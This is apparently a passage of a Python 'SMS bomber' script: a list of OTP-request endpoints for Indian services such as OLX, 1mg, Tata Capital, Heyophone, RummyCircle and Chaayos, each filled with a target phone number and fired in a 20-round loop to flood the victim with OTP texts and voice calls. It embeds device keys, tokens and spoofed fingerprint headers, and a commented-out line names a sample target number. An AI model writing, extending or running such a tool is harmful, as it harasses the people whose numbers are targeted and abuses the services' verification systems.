                "x-dv-token": "DT_wA_YJZxu93CqKYPVr7VsQUhIYFwsEXIDtRrij4wL3h2",
                "user-bucket": "0",
                "user-high-priority": "1",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip, deflate, br"
            },
            "data": {
                "phone": number,
                "country_id": "1",
                "package_name": "",
                "verification_type": "call",
                "message_uuid": "sms-service-v2-7d7026e5-00d9-46da-802f-3c0b74250afb"
            }
        },
        {
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "data": {
                "mobile": number,
                "organizationId": "5eb393ee95fab7468a79d189"
            },
            "headers": {
                "sec-ch-ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "client-version": "1114",
                "Authorization": "Bearer YOUR_BEARER_TOKEN",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://www.pw.live/",
                "randomId": "9242fe67-d24e-4fb1-8859-3d726e2471e3",
                "client-id": "5eb393ee95fab7468a79d189",
                "Client-Type": "WEB",
                "sec-ch-ua-platform": '"Windows"'
            }
        },
        {
            "url": "https://api.olx.in/v2/auth/authenticate",
            "method": "POST",
            "data": {
                "grantType": "retry",
                "method": "call",
                "phone": "+91" + number
            },
            "headers": {
                "X-acf-sensor-data": "2,a,TMpKRTdoxJtA/bMtiQzskHx92U6siCaYWjBkNZaMsStuWWZ8O8m6MzoKfX2vfY1xHLr/yo3Gqb3Vyw7O39A0je0OuB/iUnEP/aai7Yu2g6XMOz8xlVpX8eB9l+dURtyhEypM+M/xqVEAXdyalyPrduvFtnx0TCyuwW6tau2maDo=,BHMkuAHLVGza6cgDuEpwN3QKPTKW0J+/J2TLj3blpjuyO2/GWlcYTZ44H7+LkSFzHOcUQibNhCZtqbTXTyo+4d6273WfIbB3vkcukA+1ZwN5WPbPJdx6FLRlhNclsMNT9lBjM6POZNnL67jknhAXDyoW+S9g/G6X0G/S4b5fWt4=\$c1f0jtr7Zs8nbUt4eHfw69RdeiqQJ+NdjDegCxj44oKDW/ki2UnT8vXzSLfAA+0HCYmhE1ESUyb8yywzdvmiXKhD82hIydxgQpVLtK9ctAHV5ASNLotwuqhi0gfPEZAgzeB9J+0XMhZ2mk+3A3jVaPdU0ya9eOlNXqy+V7zq0x1p6keahAFF2wgyqpq2775oq+OsP6OojhZI22tm0ZcsD7ElJ60GvKf1hDxtxxv8xugjeNG7CazWqHDpTL7Fb5BA/emn/lalI+JvhMaRc65RGNvfolQ2nVugn5dtJkG/BkwSayn/1Gtke4lHr9CqqOnb5gNhXDZ96hIGJtw8B+0HznBNetWq06xuAFSnjzd+vx/wc53NrHRPikfWhNeeJumE2U9WFuWZOHdb4hBvxQuOxDUNhiIP79n1qfVfszDhZ5Ezn7WFIO7Pl5KD6OHvDfCUzZeJ/g4vGUdrjDvq247LANeV/CqsqSVASZzP26BnANtgFF6kQAgATvvXwCcBYDpEIOeM0s27vMiDOemQiDqOpMYmdhAEjL2Vbvy6w3WY5X0roTcOFiXBqn8VsVEHiHHDEszzDxbNV2ueDV5Du7nRfTLt9ZF9LzJzy0sd9639DgmYm4r2CyYw9rIrQZHZhZ5G/DJml9r8XghR2ZulvClJfwhf1T/Xe8fNozCN9+Bm2+jOpWDfR9HZafMiWyuEGtyaekFRA2bgRVt25Q5vtRMgwQqoAmXHJ/YY8SWLFLY2NfFBkVCAjEuW5+Z6lISBL4KgyIrcz9FA/K4hzWz7sChPr2Wz6cwe6f6y50RanzhQRVn7Sac5MnJ0EbqArp+GqzleKCg1kZfNtVnB0HQqTLs29P+hA2DHct3KxFl0kEtL91w+81Y06s759oFINDics0ik1YL5Ghm0M+sdzmuvd7BVTm16Dpwg27/Dnf+BCs7+zGz2DXD4q3mNZ0U+neXYgGinKIRiUkf6ATs/RKsz41TVvQE1lTiZ4L9Sdqqyuu05/YRZrXNlx/uOkWEemsiM2B6Xq/OZC27b1aLbz4q4QIKzpjzN7fY9brMalcu5MVzm4GU=",
                "X-Panamera-fingerprint": "807da1a35e55235e",
                "User-Agent": "android 17.08.011 olxin",
                "x-origin-panamera": "Production",
                "laquesis": "pan-41767@b#pan-48465@b#pan-52057@b#pan-53615@b#pan-55363@b#pan-55982@b#pan-59448@b#pan-62267@a#pan-68253@a#road-43386@b#road-47263@a#road-74127@b",
                "laquesisff": "rate_us#resend_code_call_me#listers_verification#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327#pan-42666#pan-45244#pan-48529#pan-48912#pan-50288#pan-50705#pan-57022#road-123",
                "Content-Type": "application/json; charset=UTF-8",
           #     "Content-Length": str(len(json.dumps(data))),
                "Host": "api.olx.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "method": "POST",
            "url": "https://api.1mg.com/api/v6/create_token",
            "headers": {
                "Host": "api.1mg.com",
                "x-platform": "Android-17.4.3",
                "x-access-key": "1mg_client_access_key",
                "x-device-id": "3dcc536049db72ae",
                "x-os-version": "13",
                "x-visitor-id": "739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552",
                "device-info": "Xiaomi/Redmi Note 7 Pro/33/13",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "cookie": "VISITOR-ID=739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "otp_on_call": True,
                "number": number
            }
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp',
            "data": {
                'sourceName': 'Google_Search',
                'mobileNumber': number,
                'deviceOS': 'Web',
                'applSource': 'PL',
                'deviceType': 'Web',
                'deviceSubType': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
            "data": {
                'phone': number,
                'isOtpViaCallAtLogin': 'true',
                'applSource': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
        {
            "method": "POST",
            "url": 'https://api.heyophone.com/heyo/v1/otp/send',
            "data": {
                "country_code": "+91",
                "number": number,
                "via": "sms"
            },
            "headers": {
                "Host": "api.heyophone.com",
                "accept": "application/json, text/plain, */*",
                "x-requested-with": "XMLHttpRequest",
                "authorization": "",
                "x-device-id": "c7abc1fd7459e84c",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            }
        },
        # Heyophone Call API
        {
            "method": "POST",
            "url": 'https://api.heyophone.com/heyo/v1/otp/send',
            "data": {
                "country_code": "+91",
                "number": number,
                "via": "call"
            },
            "headers": {
                "Host": "api.heyophone.com",
                "accept": "application/json, text/plain, */*",
                "x-requested-with": "XMLHttpRequest",
                "authorization": "",
                "x-device-id": "c7abc1fd7459e84c",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            }
        },
        {
            "method": "POST",
            "url": 'https://m.rummycircle.com/api/fl/account/v1/sendOtp',
            "data": {
                "mobile": number,
                "otpOnCall": True,
                "otpType": 6,
                "transactionId": 1726768466917  # Transaction ID may need to be dynamically generated
            },
            "headers": {
                "Host": "m.rummycircle.com",
                "Origin": "https://m.rummycircle.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-F9360 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36 (/rcchannelid:11000.62/) (/rcprimary:396/) [RCAndroid/11000.62] [RCPlayStoreAndroid/11000.62]",
                "geolocstate": "",
                "Cookie": 'sameSiteNoneSupported=true; device.info.cookie={"bv":"4.0","bn":"Android Browser","osv":"14","osn":"Android","tbl":"false","vnd":"Samsung","mdl":"SM-F9360"}; NA_IDVISIT=b2e47e3c-141f-40fb-b4d5-e7688a3458fb; NA_VISITOR=b2e47e3c-141f-40fb-b4d5-e7688a3458fb; SSID=SSID106c7918-8fad-45bf-90a3-94e2f7252fe8;',
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "method": "POST",
            "url": 'https://app.chaayos.com/app-crm/v2/crm/lkp/1000',
            "data": {
                "country": "+91",
                "contact": number,
                "companyId": 1000,
                "deviceId": "pineapple",
                "deviceKey": "RT8CyWByRqGMsKXfynC6kmCrV8hDWZUd65RhqSljeY+47mqwpDDyfhrJRnWc7JAp",
                "cartId": "66ed39c5e4f59c3594f51b95"
            },
            "headers": {
                "Host": "app.chaayos.com",
                "Accept": "application/json",
                "DeviceKey": "RT8CyWByRqGMsKXfynC6kmCrV8hDWZUd65RhqSljeY+47mqwpDDyfhrJRnWc7JAp",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.2"
            }
        },
        # Second API
        {
            "method": "POST",
            "url": 'https://app.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000',
            "data": number,
            "headers": {
                "Host": "app.chaayos.com",
                "Accept": "application/json",
                "DeviceKey": "RT8CyWByRqGMsKXfynC6kmCrV8hDWZUd65RhqSljeY+47mqwpDDyfhrJRnWc7JAp",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.2"
            }
        },
        # Third API
        {
            "method": "POST",
            "url": 'https://app.chaayos.com/app-crm/v2/crm/v/r2/1000',
            "data": number,
            "headers": {
                "Host": "app.chaayos.com",
                "Accept": "application/json",
                "DeviceKey": "RT8CyWByRqGMsKXfynC6kmCrV8hDWZUd65RhqSljeY+47mqwpDDyfhrJRnWc7JAp",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.2"
            }
        }
        # Other APIs remain the same
    ]
    
    # Run the requests for 50 iterations
    for _ in range(20):
        for api in apis:
            try:
                # Set a timeout of 5 seconds for each request
                if api["method"] == "POST":
                    response = requests.post(api["url"], json=api["data"], headers=api["headers"], timeout=2)
                elif api["method"] == "GET":
                    response = requests.get(api["url"], headers=api["headers"], timeout=2)
                elif api["method"] == "PUT":
                    response = requests.put(api["url"], headers=api["headers"], timeout=2)
                print(f"Request to {api['url']} - Status Code: {response.status_code}")
            except requests.exceptions.Timeout:
                print(f"Request to {api['url']} timed out. Skipping...")
            except Exception as e:
                print(f"Error during request to {api['url']}: {e}")
        # Add a delay of 10 seconds between requests
        # time.sleep(10)

# Example: Replace with the actual phone number you want to use
#smsg("9336734442")
